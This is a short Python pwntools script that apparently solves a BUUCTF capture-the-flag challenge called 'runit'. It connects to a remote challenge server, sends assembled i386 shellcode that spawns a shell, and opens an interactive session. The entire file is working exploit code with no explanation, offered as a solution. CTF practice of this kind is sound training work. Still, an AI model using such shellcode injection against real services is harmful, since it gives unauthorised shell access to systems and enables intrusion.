from pwn import *

context(os = 'linux', arch = 'i386', log_level = 'debug')
# io = process('runit')
io = remote('node4.buuoj.cn', 29505)
# libc = ELF('/home/payoung/Downloads/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')
# libc = ELF('libc-2.27.so')
elf = ELF('runit')

payload = asm(shellcraft.sh())
io.sendlineafter('Send me stuff!!\n', payload)
io.interactive()
